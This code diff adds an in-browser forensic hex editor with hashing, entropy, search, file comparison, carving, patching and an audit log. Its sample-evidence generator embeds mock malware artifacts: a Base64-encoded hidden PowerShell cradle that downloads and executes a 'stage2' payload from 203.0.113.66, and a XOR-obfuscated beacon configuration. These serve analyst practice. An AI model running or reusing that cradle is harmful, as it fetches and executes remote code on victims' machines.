+SHA256.prototype.update = MD5.prototype.update;
+SHA256.prototype.digest = function () {
+  const bits = this.total * 8, pad = new Uint8Array(((this.len < 56 ? 56 : 120) - this.len) + 8);
+  pad[0] = 0x80;
+  const lo = bits >>> 0, hi = Math.floor(bits / 4294967296) >>> 0, p = pad.length - 8;
+  for (let i = 0; i < 4; i++) { pad[p + 7 - i] = (lo >>> (8 * i)) & 255; pad[p + 3 - i] = (hi >>> (8 * i)) & 255; }
+  const total = this.total; this.update(pad); this.total = total;
+  let out = '';
+  for (let i = 0; i < 8; i++) out += (this.h[i] >>> 0).toString(16).padStart(8, '0');
+  return out;
+};
+
+// ---------------- helpers ----------------
+const CH = 4 << 20; // 4 MiB reads
+const readSlice = async (blob, start, end) => new Uint8Array(await blob.slice(start, end).arrayBuffer());
+const cancelled = new Set();
+let lastPost = 0;
+function progress(id, data, force) {
+  const now = Date.now();
+  if (force || now - lastPost > 120) { lastPost = now; postMessage({ id, type: 'progress', ...data }); return true; }
+  return false;
+}
+function latin1(u8) {
+  let s = '';
+  for (let i = 0; i < u8.length; i += 0x8000) s += String.fromCharCode.apply(null, u8.subarray(i, i + 0x8000));
+  return s;
+}
+const lowerByte = b => (b >= 65 && b <= 90 ? b + 32 : b);
+
+async function hashBlob(id, blob) {
+  const md5 = new MD5(), sha = new SHA256();
+  for (let off = 0; off < blob.size; off += CH) {
+    if (cancelled.has(id)) throw new Error('cancelled');
+    const b = await readSlice(blob, off, Math.min(blob.size, off + CH));
+    md5.update(b); sha.update(b);
+    progress(id, { done: off + b.length, total: blob.size });
+  }
+  return { md5: md5.digest(), sha256: sha.digest() };
+}
+
+function shannon(buf) {
+  const h = new Uint32Array(256);
+  for (let i = 0; i < buf.length; i++) h[buf[i]]++;
+  let e = 0;
+  for (let i = 0; i < 256; i++) if (h[i]) { const p = h[i] / buf.length; e -= p * Math.log2(p); }
+  return e;
+}
+async function entropy(id, blob) {
+  const size = blob.size, MAXB = 2048, SAMPLE = 64 * 1024;
+  const buckets = Math.max(1, Math.min(MAXB, Math.ceil(size / 1024)));
+  const block = Math.ceil(size / buckets) || 1;
+  const values = [];
+  for (let i = 0; i < buckets; i++) {
+    if (cancelled.has(id)) throw new Error('cancelled');
+    const off = i * block;
+    if (off >= size) break;
+    const b = await readSlice(blob, off, Math.min(size, off + Math.min(block, SAMPLE)));
+    values.push(b.length ? Math.round(shannon(b) * 100) / 100 : 0);
+    if (i % 16 === 0) progress(id, { values: values.slice(), block, buckets });
+  }
+  return { values, block, buckets, sampled: block > SAMPLE };
+}
+
+function parseHexPattern(q) {
+  const clean = q.replace(/0x/gi, '').replace(/[\s,]+/g, '');
+  if (!clean.length || clean.length % 2) throw new Error('Hex pattern needs whole bytes, e.g. 4D 5A ?? 00');
+  const out = [];
+  for (let i = 0; i < clean.length; i += 2) {
+    const t = clean.slice(i, i + 2);
+    if (t === '??') out.push(-1);
+    else if (/^[0-9a-f]{2}$/i.test(t)) out.push(parseInt(t, 16));
+    else throw new Error(`"${t}" is not a hex byte. Use 00–FF, or ?? as a wildcard.`);
+  }
+  if (out.every(b => b === -1)) throw new Error('Pattern cannot be all wildcards');
+  return out;
+}
+function utf16le(s) { const o = []; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); o.push(c & 255, c >> 8); } return o; }
+function compileSearch({ q, type, ci }) {
+  if (!q) throw new Error('Enter something to search for');
+  if (type === 'regex') {
+    try { return { kind: 'regex', re: new RegExp(q, 'g' + (ci ? 'i' : '')), overlap: 4096 }; }
+    catch (e) { throw new Error('Regex error: ' + e.message); }
+  }
+  let pat;
+  if (type === 'hex') pat = parseHexPattern(q);
+  else if (type === 'utf16') pat = utf16le(q);
+  else { pat = []; for (let i = 0; i < q.length; i++) pat.push(q.charCodeAt(i) & 255); }
+  const fold = ci && type !== 'hex';
+  if (fold) pat = pat.map(lowerByte);
+  return { kind: 'bytes', pat, fold, overlap: pat.length - 1 };
+}
+function findBytes(buf, pat, fold, limitPos, onMatch) {
+  const n = pat.length, first = pat.findIndex(b => b !== -1), fb = pat[first];
+  for (let i = 0; i + n <= buf.length && i < limitPos;) {
+    if (!fold) {
+      const j = buf.indexOf(fb, i + first);
+      if (j === -1) return;
+      i = j - first;
+      if (i + n > buf.length || i >= limitPos) return;
+    }
+    let ok = true;
+    for (let k = 0; k < n; k++) {
+      const p = pat[k];
+      if (p === -1) continue;
+      const b = fold ? lowerByte(buf[i + k]) : buf[i + k];
+      if (b !== p) { ok = false; break; }
+    }
+    if (ok && onMatch(i, n) === false) return;
+    i++;
+  }
+}
+async function search(id, blob, opts) {
+  const spec = compileSearch(opts), MAX = 5000;
+  const size = blob.size, from = Math.max(0, Math.min(size, Number(opts.from) || 0));
+  const matches = []; let truncated = false, sent = 0;
+  const add = (off, len, preview) => {
+    if (matches.length >= MAX) { truncated = true; return false; }
+    matches.push(preview ? [off, len, preview] : [off, len]); return true;
+  };
+  let tail = new Uint8Array(0), base = from;
+  const scan = (buf, final) => {
+    const limit = final ? buf.length : Math.max(0, buf.length - spec.overlap);
+    let keepFrom = limit;
+    if (spec.kind === 'bytes') {
+      findBytes(buf, spec.pat, spec.fold, final ? buf.length : buf.length - spec.pat.length + 1, (i, n) => add(base + i, n));
+      keepFrom = Math.max(0, buf.length - spec.overlap);
+    } else {
+      const str = latin1(buf); spec.re.lastIndex = 0; let m;
+      while ((m = spec.re.exec(str))) {
+        if (m[0].length === 0) { spec.re.lastIndex++; continue; }
+        if (m.index >= limit) break;
+        if (!add(base + m.index, m[0].length, m[0].slice(0, 80))) break;
+        keepFrom = Math.max(keepFrom, m.index + m[0].length);
+      }
+      keepFrom = Math.min(keepFrom, buf.length);
+    }
+    return keepFrom;
+  };
+  for (let off = from; off < size; off += CH) {
+    if (cancelled.has(id)) return { matches: matches.slice(sent), count: matches.length, truncated, state: 'cancelled' };
+    const chunk = await readSlice(blob, off, Math.min(size, off + CH));
+    let buf = chunk;
+    if (tail.length) { buf = new Uint8Array(tail.length + chunk.length); buf.set(tail); buf.set(chunk, tail.length); }
+    const final = off + CH >= size;
+    const keepFrom = scan(buf, final);
+    if (final) { tail = new Uint8Array(0); }
+    else { tail = buf.slice(keepFrom); base += keepFrom; }
+    if (progress(id, { done: Math.min(size, off + CH) - from, total: size - from, count: matches.length, matches: matches.slice(sent) })) sent = matches.length;
+    if (truncated) break;
+  }
+  return { matches: matches.slice(sent), count: matches.length, truncated, state: 'done', done: size - from, total: size - from };
+}
+
+async function compare(id, a, b) {
+  const size = Math.max(a.size, b.size), common = Math.min(a.size, b.size);
+  const buckets = Math.max(1, Math.min(2048, size)), bucketSize = Math.ceil(size / buckets) || 1;
+  const map = new Array(buckets).fill(0), runs = [], MAXR = 10000;
+  let runCount = 0, diffBytes = 0, firstDiff = null, truncated = false, runStart = -1, sent = 0;
+  const mark = (start, len) => {
+    for (let o = start; o < start + len;) {
+      const bi = Math.floor(o / bucketSize), end = Math.min(start + len, (bi + 1) * bucketSize);
+      map[bi] += end - o; o = end;
+    }
+  };
+  const close = (start, len) => {
+    runCount++; diffBytes += len; mark(start, len);
+    if (runs.length < MAXR) runs.push([start, len]); else truncated = true;
+  };
+  const t0 = Date.now();
+  for (let off = 0; off < common; off += CH) {
+    if (cancelled.has(id)) throw new Error('cancelled');
+    const end = Math.min(common, off + CH);
+    const [ba, bb] = await Promise.all([readSlice(a, off, end), readSlice(b, off, end)]);
+    const n = ba.length;
+    for (let i = 0; i < n; i++) {
+      if (ba[i] !== bb[i]) {
+        if (runStart < 0) { runStart = off + i; if (firstDiff === null) firstDiff = runStart; }
+      } else if (runStart >= 0) { close(runStart, off + i - runStart); runStart = -1; }
+    }
+    if (progress(id, { done: end, total: size, common, sizeA: a.size, sizeB: b.size, diffBytes, runCount, firstDiff, truncated, bucketSize, map, runs: runs.slice(sent) })) sent = runs.length;
+  }
+  if (runStart >= 0) close(runStart, common - runStart);
+  let tail = null;
+  if (size > common) {
+    if (firstDiff === null) firstDiff = common;
+    tail = { start: common, len: size - common, onlyIn: a.size > b.size ? 'A' : 'B' };
+    mark(common, size - common);
+  }
+  return { state: 'done', done: size, total: size, common, sizeA: a.size, sizeB: b.size, diffBytes, runCount, firstDiff, truncated, bucketSize, map, runs: runs.slice(sent), tail, ms: Date.now() - t0 };
+}
+
+onmessage = async e => {
+  const { id, op, args } = e.data;
+  if (op === 'cancel') { cancelled.add(args.target); return; }
+  try {
+    let result;
+    if (op === 'hash') result = await hashBlob(id, args.blob);
+    else if (op === 'entropy') result = await entropy(id, args.blob);
+    else if (op === 'search') result = await search(id, args.blob, args.opts);
+    else if (op === 'compare') result = await compare(id, args.a, args.b);
+    else throw new Error('Unknown operation ' + op);
+    postMessage({ id, type: 'done', result });
+  } catch (err) {
+    postMessage({ id, type: 'error', error: err.message || String(err), cancelled: cancelled.has(id) });
+  } finally { cancelled.delete(id); }
+};
+
+</script>
+<script>
+// Magic number table: [offset, hex bytes ("??" = any), label]
+// Longest match at the lowest offset wins.
+window.MAGIC = [
+  [0, '4D 5A', 'Windows PE / DOS executable (MZ)'],
+  [0, '7F 45 4C 46', 'ELF executable'],
+  [0, 'CA FE BA BE', 'Java class or Mach-O fat binary'],
+  [0, 'FE ED FA CE', 'Mach-O (32-bit)'],
+  [0, 'FE ED FA CF', 'Mach-O (64-bit)'],
+  [0, 'CE FA ED FE', 'Mach-O (32-bit, LE)'],
+  [0, 'CF FA ED FE', 'Mach-O (64-bit, LE)'],
+  [0, '64 65 78 0A', 'Android DEX'],
+  [0, '00 61 73 6D', 'WebAssembly'],
+  [0, '23 21', 'Script with shebang (#!)'],
+  [0, '50 4B 03 04', 'ZIP archive (also DOCX/XLSX/JAR/APK)'],
+  [0, '50 4B 05 06', 'ZIP archive (empty)'],
+  [0, '52 61 72 21 1A 07', 'RAR archive'],
+  [0, '37 7A BC AF 27 1C', '7-Zip archive'],
+  [0, '1F 8B', 'gzip'],
+  [0, '42 5A 68', 'bzip2'],
+  [0, 'FD 37 7A 58 5A 00', 'xz'],
+  [0, '28 B5 2F FD', 'Zstandard'],
+  [0, '4D 53 43 46', 'Microsoft Cabinet (CAB)'],
+  [0, '21 3C 61 72 63 68 3E', 'ar archive / .deb'],
+  [0, '68 73 71 73', 'SquashFS'],
+  [0, '25 50 44 46', 'PDF document'],
+  [0, 'D0 CF 11 E0 A1 B1 1A E1', 'OLE compound file (DOC/XLS/MSG/MSI)'],
+  [0, '7B 5C 72 74 66', 'Rich Text Format'],
+  [0, '3C 3F 78 6D 6C', 'XML document'],
+  [0, '49 54 53 46', 'Compiled HTML Help (CHM)'],
+  [0, '89 50 4E 47 0D 0A 1A 0A', 'PNG image'],
+  [0, 'FF D8 FF', 'JPEG image'],
+  [0, '47 49 46 38', 'GIF image'],
+  [0, '49 49 2A 00', 'TIFF image (LE)'],
+  [0, '4D 4D 00 2A', 'TIFF image (BE)'],
+  [0, '52 49 46 46', 'RIFF container (WAV/AVI/WebP)'],
+  [4, '66 74 79 70', 'ISO media (MP4/MOV/HEIC)'],
+  [0, '1A 45 DF A3', 'Matroska / WebM'],
+  [0, '4F 67 67 53', 'Ogg'],
+  [0, '49 44 33', 'MP3 with ID3 tag'],
+  [0, '53 51 4C 69 74 65 20 66 6F 72 6D 61 74 20 33 00', 'SQLite 3 database'],
+  [0, '72 65 67 66', 'Windows registry hive (regf)'],
+  [0, '68 62 69 6E', 'Registry hive bin (hbin)'],
+  [0, '4C 00 00 00 01 14 02 00', 'Windows shortcut (LNK)'],
+  [4, '53 43 43 41', 'Windows Prefetch (uncompressed)'],
+  [0, '4D 41 4D 04', 'Windows Prefetch (Win10 compressed)'],
+  [0, '45 6C 66 46 69 6C 65 00', 'Windows event log (EVTX)'],
+  [4, '4C 66 4C 65', 'Windows event log (legacy EVT)'],
+  [0, '46 49 4C 45', 'NTFS MFT record (FILE)'],
+  [3, '4E 54 46 53 20 20 20 20', 'NTFS boot sector'],
+  [0, '4D 44 4D 50 93 A7', 'Windows minidump'],
+  [0, '50 41 47 45', 'Windows crash dump'],
+  [0, '45 56 46 09 0D 0A FF 00', 'EnCase image (E01)'],
+  [0, '4B 44 4D 56', 'VMware disk (VMDK sparse)'],
+  [0, '63 6F 6E 65 63 74 69 78', 'Virtual PC disk (VHD)'],
+  [0, '76 68 64 78 66 69 6C 65', 'Hyper-V disk (VHDX)'],
+  [0, '51 46 49 FB', 'QEMU disk (QCOW)'],
+  [0, 'D4 C3 B2 A1', 'pcap capture (LE)'],
+  [0, 'A1 B2 C3 D4', 'pcap capture (BE)'],
+  [0, '0A 0D 0D 0A', 'pcapng capture'],
+  [0, 'ED AB EE DB', 'RPM package'],
+  [0, 'EF BB BF', 'UTF-8 text with BOM'],
+  [0, 'FF FE', 'UTF-16LE text with BOM'],
+  [0, 'FE FF', 'UTF-16BE text with BOM'],
+].map(([off, h, label]) => ({ off, label, bytes: h.split(' ').map(t => t === '??' ? -1 : parseInt(t, 16)) }));
+
+// bytes: array-like; base: absolute offset of bytes[0] relative to the structure start.
+window.detectMagic = function (bytes) {
+  let best = null;
+  for (const m of window.MAGIC) {
+    if (bytes.length < m.off + m.bytes.length) continue;
+    let ok = true;
+    for (let i = 0; i < m.bytes.length; i++) {
+      const b = m.bytes[i];
+      if (b !== -1 && bytes[m.off + i] !== b) { ok = false; break; }
+    }
+    if (ok && (!best || m.bytes.length > best.bytes.length)) best = m;
+  }
+  return best;
+};
+
+</script>
+<script>
+// Hexes in-browser backend. Mirrors the Node server's API so the UI code stays the same.
+// Files never leave the browser: everything is read with File.slice() and processed in a Worker.
+(() => {
+'use strict';
+const WORKER_SRC = document.getElementById('worker-src').textContent;
+const worker = new Worker(URL.createObjectURL(new Blob([WORKER_SRC], { type: 'text/javascript' })));
+const pending = new Map();
+let seq = 0;
+worker.onmessage = e => {
+  const m = e.data, p = pending.get(m.id);
+  if (!p) return;
+  if (m.type === 'progress') { p.onProgress && p.onProgress(m); return; }
+  pending.delete(m.id);
+  if (m.type === 'done') p.resolve(m.result);
+  else { const err = new Error(m.error); err.cancelled = m.cancelled; p.reject(err); }
+};
+function run(op, args, onProgress) {
+  const id = ++seq;
+  const promise = new Promise((resolve, reject) => pending.set(id, { resolve, reject, onProgress }));
+  worker.postMessage({ id, op, args });
+  return { id, promise };
+}
+const cancel = id => worker.postMessage({ op: 'cancel', args: { target: id } });
+const rid = n => Array.from(crypto.getRandomValues(new Uint8Array(n)), b => b.toString(16).padStart(2, '0')).join('');
+const hex = n => '0x' + n.toString(16).toUpperCase();
+
+// ---------- session log ----------
+const log = [];
+function audit(entry) { log.push({ time: new Date().toISOString(), ...entry }); }
+
+// ---------- downloads ----------
+function download(blob, name) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = name; a.rel = 'noopener';
+  document.body.appendChild(a); a.click(); a.remove();
+  return url; // kept alive so "Download again" works
+}
+
+// ---------- files ----------
+const slots = { a: null, b: null };
+let cmp = null;
+
+function info(f) { return { id: f.id, name: f.name, path: f.name, size: f.size, mtime: f.mtime, slot: f.slot }; }
+function closeSlot(slot) {
+  const f = slots[slot];
+  if (cmp) { if (cmp.state === 'running') cancel(cmp.wid); cmp = null; }
+  if (!f) return;
+  f.closed = true;
+  for (const id of f.jobs) cancel(id);
+  slots[slot] = null;
+}
+function openBlob(file, slot) {
+  closeSlot(slot);
+  const f = {
+    id: rid(6), file, name: file.name || 'untitled.bin', size: file.size,
+    mtime: file.lastModified ? new Date(file.lastModified).toISOString() : null,
+    slot, hash: { state: 'running', done: 0 }, entropy: null, searches: new Map(), jobs: new Set(),
+  };
+  slots[slot] = f;
+  const t0 = performance.now();
+  const job = run('hash', { blob: file }, m => { f.hash.done = m.done; });
+  f.jobs.add(job.id);
+  job.promise.then(h => {
+    Object.assign(f.hash, { state: 'done', ...h, ms: Math.round(performance.now() - t0) });
+    audit({ action: slot === 'b' ? 'open-compare' : 'open', file: f.name, size: f.size, lastModified: f.mtime, md5: h.md5, sha256: h.sha256 });
+  }).catch(e => { if (!e.cancelled) Object.assign(f.hash, { state: 'error', error: e.message }); })
+    .finally(() => f.jobs.delete(job.id));
+  return info(f);
+}
+function need(id) {
+  const f = id ? [slots.a, slots.b].find(x => x && x.id === id) : slots.a;
+  if (!f) throw new Error(slots.a || slots.b ? 'That file is no longer open' : 'No file is open');
+  return f;
+}
+const int = (v, d) => { const n = Number(v); return Number.isFinite(n) ? Math.floor(n) : d; };
+async function hashOf(blob) { return run('hash', { blob }).promise; }
+
+// ---------- API ----------
+async function request(path, opts = {}) {
+  const [route, qs] = path.split('?');
+  const q = Object.fromEntries(new URLSearchParams(qs || ''));
+  const body = opts.body || {};
+  const post = (opts.method || 'GET') === 'POST';
+
+  if (route === 'session') return { file: slots.a ? info(slots.a) : null, fileB: slots.b ? info(slots.b) : null };
+
+  if (route === 'open' && post) {
+    const slot = body.slot === 'b' ? 'b' : 'a';
+    let file = body.file;
+    if (body.sample) file = slot === 'b' ? sampleB() : sampleA();
+    if (!file) throw new Error('Choose a file to open');
+    return openBlob(file, slot);
+  }
+  if (route === 'close' && post) { closeSlot(body.slot === 'b' ? 'b' : 'a'); return { ok: true }; }
+
+  if (route === 'read') {
+    const f = need(q.id);
+    const offset = Math.max(0, int(q.offset, 0));
+    const length = Math.max(0, Math.min(1 << 20, int(q.length, 65536), f.size - offset));
+    return new Uint8Array(await f.file.slice(offset, offset + length).arrayBuffer());
+  }
+  if (route === 'hash') { const f = need(q.id); return { ...f.hash, size: f.size }; }
+
+  if (route === 'hashrange') {
+    const f = need(q.id);
+    const start = Math.max(0, int(q.start, 0)), end = Math.min(f.size, int(q.end, 0));
+    if (end <= start) throw new Error('Select at least one byte');
+    return { start, end, ...(await hashOf(f.file.slice(start, end))) };
+  }
+
+  if (route === 'entropy') {
+    const f = need(q.id);
+    if (!f.entropy) {
+      const e = f.entropy = { state: 'running', values: [], block: 0, buckets: 1, sampled: false };
+      const job = run('entropy', { blob: f.file }, m => Object.assign(e, { values: m.values, block: m.block, buckets: m.buckets }));
+      f.jobs.add(job.id);
+      job.promise.then(r => Object.assign(e, r, { state: 'done' }))
+        .catch(err => { if (!err.cancelled) Object.assign(e, { state: 'error', error: err.message }); })
+        .finally(() => f.jobs.delete(job.id));
+    }
+    return { ...f.entropy, values: f.entropy.values.slice() };
+  }
+
+  if (route === 'search' && post) {
+    const f = need(body.id);
+    for (const j of f.searches.values()) if (j.state === 'running') { j.state = 'cancelled'; cancel(j.wid); }
+    // validate synchronously-ish so errors show immediately
+    if (!body.q) throw new Error('Enter something to search for');
+    if (body.type === 'regex') { try { new RegExp(body.q); } catch (e) { throw new Error('Regex error: ' + e.message); } }
+    if (body.type === 'hex') {
+      const c = body.q.replace(/0x/gi, '').replace(/[\s,]+/g, '');
+      if (!c.length || c.length % 2) throw new Error('Hex pattern needs whole bytes, e.g. 4D 5A ?? 00');
+      const bad = (c.match(/.{2}/g) || []).find(t => t !== '??' && !/^[0-9a-f]{2}$/i.test(t));
+      if (bad) throw new Error(`"${bad}" is not a hex byte. Use 00–FF, or ?? as a wildcard.`);
+      if (/^(\?\?)+$/.test(c)) throw new Error('Pattern cannot be all wildcards');
+    }
+    const j = { id: rid(4), state: 'running', done: 0, total: f.size, matches: [], count: 0, truncated: false };
+    const job = run('search', { blob: f.file, opts: { q: body.q, type: body.type, ci: body.ci, from: body.from } }, m => {
+      if (j.state !== 'running') return;
+      j.done = m.done; j.total = m.total;
+      if (m.matches) j.matches.push(...m.matches);
+    });
+    j.wid = job.id; f.jobs.add(job.id);
+    job.promise.then(r => {
+      if (j.state === 'running' || r.state === 'cancelled') { j.matches.push(...r.matches); j.truncated = r.truncated; j.state = r.state; j.done = j.total; }
+    }).catch(err => { j.state = err.cancelled ? 'cancelled' : 'error'; j.error = err.message; })
+      .finally(() => f.jobs.delete(job.id));
+    f.searches.set(j.id, j);
+    return { job: j.id };
+  }
+  if (route === 'search') {
+    const f = need(q.id), j = f.searches.get(q.job);
+    if (!j) throw new Error('Search not found');
+    if (q.cancel && j.state === 'running') { cancel(j.wid); }
+    const since = Math.max(0, int(q.since, 0));
+    return { state: j.state, done: j.done, total: j.total, count: j.matches.length, truncated: j.truncated, error: j.error, matches: j.matches.slice(since) };
+  }
+
+  if (route === 'compare' && post) {
+    const a = slots.a, b = slots.b;
+    if (!a || !b) throw new Error('Open both an A file and a B file to compare');
+    if (body.a !== a.id || body.b !== b.id) throw new Error('One of those files is no longer open');
+    if (cmp && cmp.state === 'running') cancel(cmp.wid);
+    const c = cmp = { id: rid(4), state: 'running', done: 0, total: Math.max(a.size, b.size), runs: [], map: null, runCount: 0, diffBytes: 0, firstDiff: null, tail: null, truncated: false, common: Math.min(a.size, b.size) };
+    const job = run('compare', { a: a.file, b: b.file }, m => {
+      const { runs, type, id, ...rest } = m;
+      Object.assign(c, rest); c.runs.push(...runs);
+    });
+    c.wid = job.id;
+    job.promise.then(r => {
+      const { runs, ...rest } = r;
+      Object.assign(c, rest); c.runs.push(...runs);
+      audit({ action: 'compare', a: a.name, b: b.name, sizeA: a.size, sizeB: b.size, diffBytes: r.diffBytes, runs: r.runCount, firstDiff: r.firstDiff, tail: r.tail });
+    }).catch(err => { c.state = err.cancelled ? 'cancelled' : 'error'; c.error = err.message; });
+    return { job: c.id };
+  }
+  if (route === 'compare') {
+    const c = cmp;
+    if (!c || c.id !== q.job) throw new Error('Comparison not found');
+    if (q.cancel && c.state === 'running') cancel(c.wid);
+    const since = Math.max(0, int(q.since, 0));
+    const { runs, map, wid, ...rest } = c;
+    return { ...rest, runs: runs.slice(since), map: q.map ? map : undefined };
+  }
+
+  if (route === 'carve' && post) {
+    const f = need(body.id);
+    const start = Math.max(0, int(body.start, 0)), end = Math.min(f.size, int(body.end, 0));
+    if (end <= start) throw new Error('Select at least one byte to carve');
+    const blob = f.file.slice(start, end, 'application/octet-stream');
+    const name = `${f.name.replace(/\.[^.]*$/, '')}_${hex(start)}-${hex(end)}.bin`;
+    const h = await hashOf(blob);
+    const url = download(blob, name);
+    audit({ action: 'carve', source: f.name, sourceSha256: f.hash.sha256 || null, start, end, out: name, size: end - start, ...h });
+    return { file: name, size: end - start, url, ...h };
+  }
+
+  if (route === 'export' && post) {
+    const f = slots.a;
+    if (!f || body.id !== f.id) throw new Error('Only the A file can be edited and exported');
+    const edits = [...new Map(body.edits || [])].filter(([o, v]) => o >= 0 && o < f.size && v >= 0 && v <= 255).sort((x, y) => x[0] - y[0]);
+    if (!edits.length) throw new Error('There are no edits to export');
+    const parts = []; let pos = 0;
+    for (const [o, v] of edits) { if (o > pos) parts.push(f.file.slice(pos, o)); parts.push(new Uint8Array([v])); pos = o + 1; }
+    if (pos < f.size) parts.push(f.file.slice(pos));
+    const blob = new Blob(parts, { type: 'application/octet-stream' });
+    const m = f.name.match(/^(.*?)(\.[^.]*)?$/);
+    const name = `${m[1]}.patched${m[2] || '.bin'}`;
+    const h = await hashOf(blob);
+    const url = download(blob, name);
+    audit({ action: 'export-patched', source: f.name, sourceSha256: f.hash.sha256 || null, changes: edits.map(([o, v]) => [hex(o), v]), out: name, ...h });
+    return { file: name, size: blob.size, changes: edits.length, url, ...h };
+  }
+
+  if (route === 'savebytes' && post) {
+    const f = need(body.id);
+    const bin = atob(String(body.data || ''));
+    if (!bin.length) throw new Error('Nothing to save');
+    const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
+    const name = String(body.name || 'decoded.bin').replace(/[^\w.\-]+/g, '_').slice(0, 120);
+    const blob = new Blob([bytes], { type: name.endsWith('.csv') ? 'text/csv' : 'application/octet-stream' });
+    const h = await hashOf(blob);
+    const url = download(blob, name);
+    audit({ action: name.endsWith('.csv') ? 'save-csv' : 'save-decoded', source: f.name, note: body.note || '', out: name, size: bytes.length, ...h });
+    return { file: name, size: bytes.length, url, ...h };
+  }
+
+  throw new Error('Unknown request ' + route);
+}
+
+function downloadLog() {
+  if (!log.length) return null;
+  const blob = new Blob([log.map(e => JSON.stringify(e)).join('\n') + '\n'], { type: 'application/x-ndjson' });
+  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+  download(blob, `hexes-log_${stamp}.jsonl`);
+  return log.length;
+}
+
+// ---------- sample evidence (generated in the browser, fake and safe) ----------
+let sampleCache = null;
+function buildSample() {
+  if (sampleCache) return sampleCache;
+  let seed = 0x1031;
+  const rnd = () => ((seed = (Math.imul(seed, 1103515245) + 12345) >>> 0) >>> 24);
+  const parts = [];
+  const enc = s => Uint8Array.from(s, c => c.charCodeAt(0) & 255);
+  const pe = new Uint8Array(1024), dv = new DataView(pe.buffer);
+  pe.set(enc('MZ'), 0); dv.setUint32(0x3c, 0x80, true);
+  pe.set(enc('This program cannot be run in DOS mode.\r\r\n$'), 0x4e);
+  pe.set(enc('PE\0\0'), 0x80); dv.setUint16(0x84, 0x8664, true);
+  dv.setUint32(0x88, Math.floor(Date.UTC(2026, 9, 31, 0, 0, 0) / 1000), true);
+  pe.set(enc('.text\0\0\0'), 0x188); pe.set(enc('.rsrc\0\0\0'), 0x1b0);
+  dv.setBigUint64(0x200, (BigInt(Date.UTC(2026, 9, 31, 23, 59, 0)) + 11644473600000n) * 10000n, true);
+  pe.set([203, 0, 113, 66], 0x210);
+  parts.push(pe);
+  parts.push(enc('Hexes sample evidence. Every byte here is fake and safe.\r\n' +
+    'C2 host=203.0.113.66 port=443 ua="Mozilla/5.0 (Windows NT 10.0)"\r\n' +
+    'Look for: a Base64 blob, a single-byte XOR string, an embedded ZIP header, and a high-entropy block.\r\n'));
+  parts.push(new Uint8Array(2048));
+  const cmd = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.66/stage2')";
+  const u16 = new Uint8Array(cmd.length * 2); for (let i = 0; i < cmd.length; i++) u16[i * 2] = cmd.charCodeAt(i);
+  let b64 = ''; for (let i = 0; i < u16.length; i += 0x8000) b64 += String.fromCharCode.apply(null, u16.subarray(i, i + 0x8000));
+  parts.push(enc('cmd=' + btoa(b64) + '\r\n'));
+  parts.push(new Uint8Array(512).fill(0x90));
+  parts.push(enc('beacon config: sleep=60000 jitter=20 host=203.0.113.66 pipe=\\\\.\\pipe\\hexes').map(b => b ^ 0x5a));
+  parts.push(new Uint8Array(4096));
+  parts.push(Uint8Array.from([0x50, 0x4b, 3, 4, 0x14, 0, 0, 0, 8, 0]));
+  const r1 = new Uint8Array(64 * 1024); for (let i = 0; i < r1.length; i++) r1[i] = rnd();
+  parts.push(r1, new Uint8Array(16384));
+  parts.push(enc('regf'), new Uint8Array(124));
+  parts.push(enc('ElfFile\0'), new Uint8Array(8184));
+  parts.push(enc('The quick brown fox audits the event log. '.repeat(1200)));
+  const r2 = new Uint8Array(96 * 1024); for (let i = 0; i < r2.length; i++) r2[i] = rnd();
+  parts.push(r2, new Uint8Array(32768));
+  const total = parts.reduce((n, p) => n + p.length, 0), out = new Uint8Array(total);
+  let o = 0; for (const p of parts) { out.set(p, o); o += p.length; }
+  return (sampleCache = out);
+}
+function sampleA() { return new File([buildSample()], 'hexes-sample.bin', { type: 'application/octet-stream', lastModified: Date.UTC(2026, 9, 31) }); }
+function sampleB() {
+  const buf = buildSample().slice(), dv = new DataView(buf.buffer);
+  dv.setUint32(0x88, Math.floor(Date.UTC(2026, 9, 31, 3, 13, 0) / 1000), true);
+  buf.set([198, 51, 100, 7], 0x210);
+  const s = String.fromCharCode.apply(null, buf.subarray(0, 4096)), j = s.indexOf('port=443');
+  const enc = t => Uint8Array.from(t, c => c.charCodeAt(0));
+  if (j >= 0) buf.set(enc('port=8443'), j);
+  for (let i = 0; i < 40; i++) buf[0x6000 + i * 97] ^= 0xff;
+  return new File([buf, enc('\r\n-- appended by the tamperer --\r\n')], 'hexes-sample-tampered.bin', { type: 'application/octet-stream', lastModified: Date.UTC(2026, 10, 1) });
+}
+
+window.HexesBackend = { request, downloadLog, logCount: () => log.length };
+})();
+
+</script>
+<script>
+(() => {
+'use strict';
+
+// ---------------------------------------------------------------- state
+const $ = s => document.querySelector(s);
+const ROW = 16;
+const CHUNK = 64 * 1024;
+const MAX_CHUNKS = 96;            // ~6 MiB of cached bytes in the browser
+const HOT = 7.2;                  // entropy (bits/byte) treated as "high"
+const HEX = '0123456789ABCDEF';
+const HX2 = Array.from({ length: 256 }, (_, i) => HEX[i >> 4] + HEX[i & 15]);
+
+const S = {
+  file: null, size: 0, digits: 8,
+  top: 0, rows: 1, rowH: 22,
+  cur: 0, anchor: null, pane: 'hex', nib: null,
+  le: true, edit: false, edits: new Map(),
+  chunks: new Map(), loading: new Set(),
+  ent: null, magic: null, hash: null,
+  hits: [], hitIdx: -1, match: null, job: null,
+  wheel: 0, dragFrom: null,
+  side: 'a', B: null, cmp: null, runs: [], diffIdx: -1, jobFile: null,
+};
+
+// ---------------------------------------------------------------- utils
+const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+const hexOff = n => n.toString(16).toUpperCase().padStart(S.digits, '0');
+const h0x = n => '0x' + n.toString(16).toUpperCase();
+function fmtSize(n) {
+  const u = ['bytes', 'KiB', 'MiB', 'GiB', 'TiB']; let i = 0, v = n;
+  while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
+  return i ? `${v.toFixed(v < 10 ? 2 : 1)} ${u[i]} (${n.toLocaleString()} bytes)` : `${n.toLocaleString()} bytes`;
+}
+function toast(msg, ms = 3200) {
+  const t = $('#toast'); t.textContent = msg; t.hidden = false;
